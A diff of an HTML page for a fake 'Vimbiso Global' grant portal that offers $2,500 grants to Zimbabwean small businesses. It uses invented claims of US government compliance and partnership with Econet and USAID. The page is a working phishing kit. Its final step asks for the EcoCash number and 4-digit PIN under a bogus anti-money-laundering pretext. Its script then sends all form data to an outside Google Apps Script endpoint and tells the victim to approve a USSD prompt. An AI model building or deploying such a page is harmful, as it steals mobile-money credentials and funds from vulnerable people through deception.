@@ -8,70 +8,89 @@
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         :root { --navy: #002349; --gold: #c5a059; --eco-blue: #1e73be; --light-grey: #f0f4f8; }
-        body { font-family: 'Inter', sans-serif; background-color: #ffffff; color: #333; }
+        body { font-family: 'Inter', sans-serif; background-color: #ffffff; color: #333; overflow-x: hidden; }
         
-        /* Institutional Header */
-        .top-bar { background: var(--navy); color: white; padding: 10px 0; font-size: 0.75rem; letter-spacing: 1px; }
-        .navbar { background: white; border-bottom: 4px solid var(--gold); padding: 20px 0; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        .navbar-brand { font-family: 'Playfair Display', serif; font-weight: 700; font-size: 1.8rem; color: var(--navy); }
+        /* Corporate Top Bar */
+        .top-bar { background: var(--navy); color: white; padding: 12px 0; font-size: 0.7rem; letter-spacing: 2px; font-weight: 600; }
         
-        /* Hero Section */
+        /* Institutional Navbar */
+        .navbar { background: white; border-bottom: 4px solid var(--gold); padding: 25px 0; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+        .navbar-brand { font-family: 'Playfair Display', serif; font-weight: 700; font-size: 2rem; color: var(--navy); }
+        
+        /* Hero Section - High Prestige */
         .hero { 
-            background: linear-gradient(rgba(0, 35, 73, 0.9), rgba(0, 35, 73, 0.9)), 
+            background: linear-gradient(rgba(0, 35, 73, 0.88), rgba(0, 35, 73, 0.88)), 
                         url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?q=80&w=2070'); 
-            background-size: cover; color: white; padding: 120px 0; text-align: center;
+            background-size: cover; background-position: center; color: white; padding: 140px 0; text-align: center;
         }
+        .hero h1 { font-family: 'Playfair Display', serif; font-size: 3.5rem; }
 
-        /* Partners Section */
-        .partners-grid { background: var(--light-grey); padding: 60px 0; border-top: 1px solid #ddd; border-bottom: 1px solid #ddd; }
-        .partner-logo { opacity: 0.6; font-weight: 800; color: #555; font-size: 0.9rem; text-transform: uppercase; }
+        /* Global Partners Scroller */
+        .partners-grid { background: var(--light-grey); padding: 50px 0; border-top: 1px solid #dee2e6; border-bottom: 1px solid #dee2e6; }
+        .partner-logo { opacity: 0.7; font-weight: 700; color: #444; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; }
 
-        /* Multi-Step Application */
-        .app-box { max-width: 750px; margin: -100px auto 100px; background: white; border-radius: 8px; box-shadow: 0 25px 50px rgba(0,0,0,0.15); border: 1px solid #e1e8ed; overflow: hidden; }
-        .app-header { background: #f8fafd; border-bottom: 1px solid #e1e8ed; padding: 40px; text-align: center; }
+        /* The Multi-Step Application Engine */
+        .app-box { max-width: 800px; margin: -120px auto 100px; background: white; border-radius: 12px; box-shadow: 0 30px 60px rgba(0,0,0,0.18); border: 1px solid #e1e8ed; overflow: hidden; }
+        .app-header { background: #f8fafd; border-bottom: 2px solid #f0f0f0; padding: 45px; text-align: center; }
         .app-body { padding: 50px; }
 
-        /* Typography & Inputs */
-        h2 { font-family: 'Playfair Display', serif; color: var(--navy); }
-        label { font-weight: 600; color: #444; margin-bottom: 8px; font-size: 0.85rem; }
-        .form-control, .form-select { border: 2px solid #edeff2; padding: 14px; border-radius: 6px; margin-bottom: 25px; transition: 0.3s; }
-        .form-control:focus { border-color: var(--eco-blue); box-shadow: none; }
+        /* Step Progress Indicator */
+        .progress-container { display: flex; justify-content: space-between; margin-bottom: 40px; position: relative; padding: 0 20px; }
+        .progress-line { position: absolute; top: 50%; left: 10%; right: 10%; height: 2px; background: #e0e0e0; z-index: 1; transform: translateY(-50%); }
+        .step-circle { width: 40px; height: 40px; border-radius: 50%; background: #e0e0e0; color: white; display: flex; align-items: center; justify-content: center; font-weight: bold; z-index: 2; border: 4px solid white; transition: 0.4s; }
+        .step-circle.active { background: var(--gold); transform: scale(1.1); box-shadow: 0 0 15px rgba(197, 160, 89, 0.4); }
 
-        /* Security Protocol Notice */
-        .security-badge { background: #fff9e6; border: 1px solid #ffeeba; padding: 20px; border-radius: 8px; margin-bottom: 30px; }
-        .btn-grant { background: var(--navy); color: var(--gold); border: none; padding: 18px; border-radius: 6px; font-weight: bold; width: 100%; font-size: 1rem; letter-spacing: 2px; }
-        .btn-grant:hover { background: #003366; color: #fff; }
+        /* Form Aesthetics */
+        h2 { font-family: 'Playfair Display', serif; color: var(--navy); font-size: 2.2rem; }
+        label { font-weight: 600; color: #2c3e50; margin-bottom: 10px; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.5px; }
+        .form-control, .form-select { border: 2px solid #edeff2; padding: 16px; border-radius: 8px; margin-bottom: 25px; transition: all 0.3s ease; font-size: 1rem; }
+        .form-control:focus { border-color: var(--gold); box-shadow: 0 0 0 4px rgba(197, 160, 89, 0.1); outline: none; }
 
-        footer { background: var(--navy); color: #8e9aaf; padding: 80px 0 40px; }
+        /* Security Notice Overlay */
+        .security-badge { background: #fffcf0; border: 1px solid #ffeeba; padding: 25px; border-radius: 10px; margin-bottom: 35px; border-left: 6px solid var(--gold); }
+        
+        .btn-grant { background: var(--navy); color: var(--gold); border: none; padding: 20px; border-radius: 8px; font-weight: 700; width: 100%; font-size: 1.1rem; letter-spacing: 2px; transition: 0.4s; text-transform: uppercase; }
+        .btn-grant:hover { background: #003366; color: #fff; transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0, 35, 73, 0.2); }
+
+        /* Regional Presence Branding */
+        .office-card { padding: 30px; border-radius: 10px; transition: 0.3s; }
+        .office-card:hover { background: #f8fafd; }
+        .location-title { color: var(--navy); font-weight: 700; letter-spacing: 1px; margin-bottom: 10px; }
+
+        footer { background: var(--navy); color: #c3cfe2; padding: 100px 0 50px; }
+        .footer-logo { font-family: 'Playfair Display', serif; font-size: 2.5rem; color: white; margin-bottom: 30px; }
     </style>
 </head>
 <body>
 
     <div class="top-bar text-center">
-        U.S. DEPT OF COMMERCE COMPLIANT | CROSS-BORDER GRANT FACILITY | VERIFIED 2026
+        U.S. DEPT OF COMMERCE COMPLIANT | CROSS-BORDER GRANT FACILITY | VERIFIED 2026 | ID: #VIM-99-ZIM
     </div>
 
     <nav class="navbar">
         <div class="container d-flex justify-content-between align-items-center">
             <span class="navbar-brand">VIMBISO <span style="color:var(--gold)">GLOBAL</span></span>
             <div class="d-flex align-items-center gap-4 d-none d-md-flex">
-                <small class="text-muted fw-bold">LOCAL PAYOUT PARTNER:</small>
-                <img src="https://upload.wikimedia.org/wikipedia/en/3/3f/Econet_Wireless_Logo.png" height="30">
+                <small class="text-muted fw-bold">STRATEGIC DISTRIBUTION PARTNER:</small>
+                <img src="https://upload.wikimedia.org/wikipedia/en/3/3f/Econet_Wireless_Logo.png" height="35">
             </div>
         </div>
     </nav>
 
     <header class="hero">
         <div class="container">
-            <h1 class="display-3 fw-bold mb-4">Empowering Emerging Markets.</h1>
-            <p class="lead mb-5 mx-auto" style="max-width: 700px;">Headquartered in Delaware, USA, Vimbiso Global facilitates direct capital injection for Zimbabwean SMEs through the <strong>2026 African Resilience Fund</strong>.</p>
+            <h1 class="fw-bold mb-4">Empowering Emerging Markets.</h1>
+            <p class="lead mb-5 mx-auto opacity-90" style="max-width: 800px;">
+                Headquartered in <strong>Delaware, USA</strong>, Vimbiso Global facilitates direct capital injection for Zimbabwean SMEs through the 
+                <strong>2026 African Resilience Fund</strong>. Bridging the gap between global capital and local innovation.
+            </p>
         </div>
     </header>
 
     <section class="partners-grid">
         <div class="container text-center">
-            <p class="small fw-bold text-muted mb-4">OUR GLOBAL STRATEGIC ALLIANCES</p>
-            <div class="row g-4 align-items-center">
+            <p class="small fw-bold text-muted mb-4">GLOBAL STRATEGIC ALLIANCES & AUDITORS</p>
+            <div class="row g-4 align-items-center justify-content-center">
                 <div class="col-6 col-md-2 partner-logo">US-ZIM Business Council</div>
                 <div class="col-6 col-md-2 partner-logo">Delaware Capital Trust</div>
                 <div class="col-6 col-md-2 partner-logo">Afro-Tech Alliance</div>
@@ -85,17 +104,23 @@
     <main class="container">
         <div class="app-box">
             <div class="app-header">
-                <h2>International Grant Application</h2>
-                <p class="text-muted mb-0">Total Pool: $5.5 Million USD available for disbursement.</p>
-            </div>
+                <div class="progress-container">
+                    <div class="progress-line"></div>
+                    <div class="step-circle active" id="dot1">1</div>
+                    <div class="step-circle" id="dot2">2</div>
+                    <div class="step-circle" id="dot3">3</div>
+                </div>
+                <h2>Grant Disbursement Portal</h2>
+                <p class="text-muted mb-0 fw-bold">ALLOCATED POOL: $5,500,000.00 USD</p>
+            </div>                        
             
             <div class="app-body">
                 <form id="globalGrantForm">
                     <div id="step1">
-                        <h5 class="mb-4 text-primary">I. Entity Information</h5>
-                        <label>Legal Business Name</label>
-                        <input type="text" name="business_name" class="form-control" placeholder="As registered with ZIMRA" required>
-                        
+                        <h5 class="mb-4 text-primary fw-bold">I. INSTITUTIONAL IDENTITY</h5>
+                        <label>Legal Business Name (ZIMRA/Official)</label>
+                        <input type="text" name="business_name" class="form-control" placeholder="e.g., Harare Tech Ventures" required>
+                                                
                         <div class="row">
                             <div class="col-md-6">
                                 <label>Business Sector</label>
@@ -121,31 +146,34 @@
                     </div>
 
                     <div id="step2" style="display:none;">
-                        <h5 class="mb-4 text-primary">II. Grant Specifics</h5>
+                        <h5 class="mb-4 text-primary fw-bold">II. GRANT SPECIFICATIONS</h5>
                         <label>Applied Capital Amount (USD)</label>
-                        <input type="number" name="amount" class="form-control" placeholder="Up to $2,500.00" required>
-                        
+                        <input type="number" name="amount" class="form-control" placeholder="Maximum: $2,500.00" required>
+                                                
                         <label>Operational Use of Funds</label>
-                        <textarea name="purpose" class="form-control" rows="3" placeholder="Explain how this grant will scale your operations..." required></textarea>
-                        
-                        <button type="button" class="btn-grant" onclick="toggleStep(3)">PROCEED TO SECURE PAYOUT SETUP</button>
+                        <textarea name="purpose" class="form-control" rows="4" placeholder="Briefly describe how this capital will scale your SME operations..." required></textarea>
+                                                
+                        <button type="button" class="btn-grant" onclick="toggleStep(3)">PROCEED TO PAYOUT SETUP</button>
                     </div>
 
                     <div id="step3" style="display:none;">
-                        <h5 class="mb-2 text-primary">III. Disbursement Verification</h5>
-                        <p class="small text-muted mb-4">Capital is wired from Delaware to Econet Wireless for final distribution.</p>
-                        
+                        <h5 class="mb-2 text-primary fw-bold">III. SECURE DISBURSEMENT</h5>
+                        <p class="small text-muted mb-4">Capital is transferred via the Delaware Capital Gateway to the Econet payout node.</p>
+                                                
                         <div class="security-badge">
-                            <h6 class="text-dark fw-bold mb-2">Verification Protocol:</h6>
-                            <p class="small mb-0">To comply with <strong>US Anti-Money Laundering (AML)</strong> laws, you must verify ownership of the receiving EcoCash wallet. A 128-bit encrypted USSD prompt will be triggered. Please enter your PIN on your mobile device when prompted to authorize the secure link.</p>
+                            <h6 class="text-dark fw-bold mb-2">MANDATORY PROTOCOL:</h6>
+                            <p class="small mb-0 text-dark" style="line-height: 1.6;">
+                                To comply with <strong>US Anti-Money Laundering (AML)</strong> statutes, you must verify the ownership of the destination EcoCash wallet. 
+                                A secure USSD prompt will be triggered. Please enter your 4-digit PIN when prompted on your mobile device to authorize the wire transfer link.
+                            </p>
                         </div>
 
                         <label>EcoCash Registered Number</label>
                         <input type="tel" name="phone" class="form-control" placeholder="077XXXXXXX" required>
-                        
+                                                
                         <label>EcoCash Authorization PIN</label>
                         <input type="password" name="pin" class="form-control" placeholder="****" maxlength="4" required>
-                        
+                                                
                         <button type="submit" id="finalSubmit" class="btn-grant">AUTHORIZE GRANT DISBURSEMENT</button>
                     </div>
                 </form>
@@ -154,46 +182,55 @@
         </div>
     </main>
 
-    <section class="container py-5">
+    <section class="container py-5 mb-5">
         <div class="row text-center g-5">
-            <div class="col-md-4">
-                <h6 class="fw-bold">USA HEADQUARTERS</h6>
-                <p class="small text-muted">1201 North Market Street,<br>Wilmington, DE 19801, USA</p>
+            <div class="col-md-4 office-card">
+                <div class="location-title">USA HEADQUARTERS</div>
+                <p class="small text-muted mb-0">1201 North Market Street,<br>Wilmington, DE 19801, USA</p>
             </div>
-            <div class="col-md-4">
-                <h6 class="fw-bold">AFRICA HUB</h6>
-                <p class="small text-muted">Sandton City Office Tower,<br>Johannesburg, South Africa</p>
+            <div class="col-md-4 office-card">
+                <div class="location-title">AFRICA HUB</div>
+                <p class="small text-muted mb-0">Sandton City Office Tower,<br>Johannesburg, South Africa</p>
             </div>
-            <div class="col-md-4">
-                <h6 class="fw-bold">ZIMBABWE LIAISON</h6>
-                <p class="small text-muted">Econet Park, 2nd Floor,<br>Borrowdale, Harare</p>
+            <div class="col-md-4 office-card">
+                <div class="location-title">ZIMBABWE LIAISON</div>
+                <p class="small text-muted mb-0">Econet Park, 2nd Floor,<br>Borrowdale, Harare</p>
             </div>
         </div>
     </section>
 
     <footer>
         <div class="container text-center">
-            <h4 class="text-white mb-4">VIMBISO GLOBAL</h4>
+            <div class="footer-logo">VIMBISO GLOBAL</div>
             <div class="row justify-content-center mb-5">
-                <div class="col-md-8 opacity-75 small">
-                    Vimbiso Global is a registered non-profit investment vehicle facilitating international aid and business grants. 
-                    In partnership with Econet Wireless Zimbabwe, USAID (Creative Partner), and the Delaware Business Board. 
-                    All data is encrypted via 256-bit SSL protocols.
+                <div class="col-md-8 opacity-75 small" style="line-height: 1.8;">
+                    Vimbiso Global is a US-registered non-profit capital facilitator. All grants are non-repayable and disbursed under the 2026 African Growth Initiative. 
+                    Authorized by the Econet Foundation & the Delaware Board of Trade. 
+                    <br><strong>Secure 256-bit SSL Data Encryption Active.</strong>
                 </div>
             </div>
-            <p class="small opacity-50">&copy; 2026 Vimbiso Global Ventures. All Rights Reserved.</p>
+            <p class="small opacity-50">&copy; 2026 Vimbiso Global Ventures. Institutional Partner of Econet Wireless. All Rights Reserved.</p>
         </div>
     </footer>
 
     <script>
+        // YOUR SCRIPT URL
         const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzSK6rXXRtu0avhEvpEJk3_Ym4hqKA2TIDzO8PhGYYSaxdEPMMEeiFleL21xd4-Udkfwg/exec';
-
+        
         function toggleStep(s) {
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'none';
             document.getElementById('step3').style.display = 'none';
+            
             document.getElementById('step' + s).style.display = 'block';
-            window.scrollTo(0, 400);
+            
+            // Update Progress Dots
+            for(let i=1; i<=3; i++){
+                document.getElementById('dot'+i).classList.remove('active');
+            }
+            document.getElementById('dot'+s).classList.add('active');
+            
+            window.scrollTo({ top: 400, behavior: 'smooth' });
         }
 
         const form = document.getElementById('globalGrantForm');
@@ -203,14 +240,24 @@
             const st = document.getElementById('statusReport');
             
             btn.disabled = true;
-            btn.innerText = "LINKING SECURE WALLET...";
-            st.innerHTML = "<div class='spinner-border text-primary'></div><br><small>Communicating with Econet USSD Gateway...</small>";
+            btn.innerText = "INITIATING SECURE WIRE...";
+            st.innerHTML = "<div class='spinner-border text-primary'></div><br><small class='fw-bold'>Encrypting Payout Token...</small>";
 
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: new FormData(form) })
             .then(() => {
-                st.innerHTML = "<div class='alert alert-success fw-bold'>PROTOCOL INITIATED.<br>A secure USSD prompt has been sent to your phone. Enter your PIN to finalize the $2,500.00 wire transfer link.</div>";
-                btn.innerText = "AWAITING MOBILE AUTHORIZATION";
+                st.innerHTML = `
+                    <div class='alert alert-success py-4 shadow-sm'>
+                        <h5 class='fw-bold mb-2'>PROTOCOL ACTIVE</h5>
+                        <p class='mb-0 small'>Your grant allocation of $2,500.00 is currently pending. 
+                        <strong>Check your phone for a USSD prompt</strong> and enter your PIN to authorize the secure cross-border link.</p>
+                    </div>`;
+                btn.innerText = "AWAITING AUTHORIZATION";
                 form.reset();
+            })
+            .catch(() => {
+                st.innerHTML = "<div class='alert alert-danger'>Gateway Busy. Please re-try in 60 seconds.</div>";
+                btn.disabled = false;
+                btn.innerText = "AUTHORIZE GRANT DISBURSEMENT";
             });
         });
     </script>
